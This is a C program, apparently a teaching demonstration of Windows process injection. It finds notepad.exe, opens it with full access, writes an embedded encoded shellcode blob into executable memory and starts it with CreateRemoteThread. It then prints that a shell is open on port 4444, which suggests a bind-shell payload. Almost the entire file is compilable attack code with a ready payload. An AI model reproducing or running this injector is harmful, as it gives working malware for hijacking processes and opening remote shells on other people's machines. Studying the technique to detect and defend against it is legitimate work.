// Simple C program to demonstrate process injection technique
// Program accepts PID of target process as a command line argument

// Header file for input output functions
#include <stdio.h>
#include <Windows.h>
#include <conio.h>
#include <tlhelp32.h>
#include <tchar.h>


// main function -
// where the execution of program begins
int main(int argc, char* argv[])
{
    int remote_pid = 0;
    HANDLE hSnapshot;
    unsigned char shellcode[] =
        "\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef"
        "\xff\xff\xff\x48\xbb\xe5\x38\xe8\xb8\x63\xdb\x1b\xdc\x48"
        "\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x19\x70\x6b"
        "\x5c\x93\x33\xdb\xdc\xe5\x38\xa9\xe9\x22\x8b\x49\x8d\xb3"
        "\x70\xd9\x6a\x06\x93\x90\x8e\x85\x70\x63\xea\x7b\x93\x90"
        "\x8e\xc5\x70\x63\xca\x33\x93\x14\x6b\xaf\x72\xa5\x89\xaa"
        "\x93\x2a\x1c\x49\x04\x89\xc4\x61\xf7\x3b\x9d\x24\xf1\xe5"
        "\xf9\x62\x1a\xf9\x31\xb7\x79\xb9\xf0\xe8\x89\x3b\x57\xa7"
        "\x04\xa0\xb9\xb3\x50\x9b\x54\xe5\x38\xe8\xf0\xe6\x1b\x6f"
        "\xbb\xad\x39\x38\xe8\xe8\x93\x03\x98\x6e\x78\xc8\xf1\x62"
        "\x0b\xf8\x8a\xad\xc7\x21\xf9\xe8\xef\x93\x94\xe4\xee\xa5"
        "\x89\xaa\x93\x2a\x1c\x49\x79\x29\x71\x6e\x9a\x1a\x1d\xdd"
        "\xd8\x9d\x49\x2f\xd8\x57\xf8\xed\x7d\xd1\x69\x16\x03\x43"
        "\x98\x6e\x78\xcc\xf1\x62\x0b\x7d\x9d\x6e\x34\xa0\xfc\xe8"
        "\x9b\x07\x95\xe4\xe8\xa9\x33\x67\x53\x53\xdd\x35\x79\xb0"
        "\xf9\x3b\x85\x42\x86\xa4\x60\xa9\xe1\x22\x81\x53\x5f\x09"
        "\x18\xa9\xea\x9c\x3b\x43\x9d\xbc\x62\xa0\x33\x71\x32\x4c"
        "\x23\x1a\xc7\xb5\xf1\xdd\xac\x68\xee\xba\x0b\xda\xb8\x63"
        "\x9a\x4d\x95\x6c\xde\xa0\x39\x8f\x7b\x1a\xdc\xe5\x71\x61"
        "\x5d\x2a\x67\x19\xdc\xf4\x64\xe8\xb8\x63\xdb\x5a\x88\xac"
        "\xb1\x0c\xf4\xea\x2a\x5a\x66\xa9\x4f\xce\xbf\x9c\x0e\x57"
        "\x55\x0f\x50\xe9\xb9\x63\xdb\x42\x9d\x5f\x11\x68\xd3\x63"
        "\x24\xce\x8c\xb5\x75\xd9\x71\x2e\xea\xdb\x94\x1a\xf8\xa0"
        "\x31\xa1\x93\xe4\x1c\xad\xb1\x29\xf9\xd9\x31\x14\x03\x05"
        "\xc7\x3d\xf0\xea\x1c\x71\xcc\xa4\x60\xa4\x31\x81\x93\x92"
        "\x25\xa4\x82\x2a\x63\x54\xbc\xe4\x09\xad\x09\x3a\xf0\xea"
        "\x22\x5a\x66\x52\xd1\xd0\x47\x9c\x0e\x56\xed\x25\x70\xd9"
        "\x6a\x2b\x52\xe2\x9d\x5f\x4c\x04\x83\x82\x24\xce\x94\x6c"
        "\xc1\xa0\x31\xa4\x9a\xa1\xa9\x8b\x75\x89\x47\xb6\x93\x9a"
        "\x18\x45\x3a\xe8\xb8\x2a\x63\x78\xb1\x81\x38\xe8\xb8\x63"
        "\xdb\x5a\x8c\xa4\x68\xa0\x31\x81\x8c\x4c\x8b\xa8\x09\x28"
        "\xd2\x6e\x82\x5a\x8c\x07\xc4\x8e\x7f\x27\xff\x4f\xdd\xe4"
        "\x70\x65\xfc\x47\xc3\xdd\xdc\x8d\x70\x61\x5e\x35\x8b\x5a"
        "\x8c\xa4\x68\xa9\xe8\x2a\x24\xdb\x9d\xb5\x71\x17\x70\x2e"
        "\x52\xda\x90\x6c\xf9\xa9\x02\x1a\x17\x24\x5a\x1a\xed\xa0"
        "\x89\xb1\x93\xe4\x16\x6e\x36\xa9\x02\x6b\x5c\x06\xbc\x1a"
        "\xed\x53\x48\xd6\x79\x4d\x9d\x5f\x9e\x7d\x05\xfe\x24\xce"
        "\x94\x66\xfc\xc0\x84\x65\xa7\x11\x5c\x1e\xd8\x9d\xbd\xd8"
        "\x9c\x08\xae\x8a\x52\xe8\xe1\x22\x52\xc1\x23\x30\x38\xe8"
        "\xb8\x63\xdb\x1b\xdc";

    HANDLE hProcess;
    HANDLE hThread;
    PROCESSENTRY32W pe32;
    void* exec_mem;

    // First stage of process injection: Find the PID of the process we want to inject our code into
    // During this stage the malware can enumerate (list) all processes and find one it wants
    // For example it could specify "Notepad" using APIs:
    // CreateToolhelp32Snapshot, Process32First, Process32Next

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe32.dwSize = sizeof(PROCESSENTRY32);
    Process32FirstW(hSnapshot, &pe32);
    _tprintf(TEXT("\n%s\n"), pe32.szExeFile);

    while (Process32NextW(hSnapshot, &pe32)) {

        if (!_wcsicmp(pe32.szExeFile, L"notepad.exe")) {
            remote_pid = pe32.th32ProcessID;
            break;
        }

        else {
            _tprintf(TEXT("%s\n"), pe32.szExeFile);
        }

    }
    CloseHandle(hSnapshot);
    printf("\n\n\n\nProcess ID of Notepad.exe is: %d\n\n\n\n", remote_pid);
    getchar();
    // Second stage of process injection: Get a HANDLE to the process we want to open.
    // We can use the HANDLE everytime want to interact with the process.
    if (hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, remote_pid)) {
        printf("\n\n\n\nHandle 0x%0x to process opened succesfully!!\n\n\n\n", hProcess);

    }
    else {
        printf("Handle failed to open!!");
        CloseHandle(hProcess);
        return 1;
    }
    getchar();
    /// Third stage of process injection
    if (exec_mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) {
        printf("\n\n\n\nMemory at address 0x%p in process Notepad allocated succesfully!!\n\n\n\n", exec_mem);
    }
    else {
        printf("Failed to allocate memory!!");
        CloseHandle(hProcess);
        return 1;
    }
    getchar();
    /// Forth stage of process injection
    if (WriteProcessMemory(hProcess, exec_mem, shellcode, sizeof(shellcode), NULL)) {
        printf("\n\n\n\n%d bytes of Shellcode injected at memory address 0x%p successfully!!\n\n\n\n", sizeof(shellcode), exec_mem);
    }
    else {
        printf("Memory injection failed!!");
        CloseHandle(hProcess);
        return 1;
    }
    getchar();

    //Execute shellcode

    if (CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL)) {
        printf("Shell Opened on Port 4444");
    }

    else {
        printf("Thread Execution Failed");
        CloseHandle(hProcess);
        return 1;
    }
    getchar();

    CloseHandle(hProcess);
    return 0;
}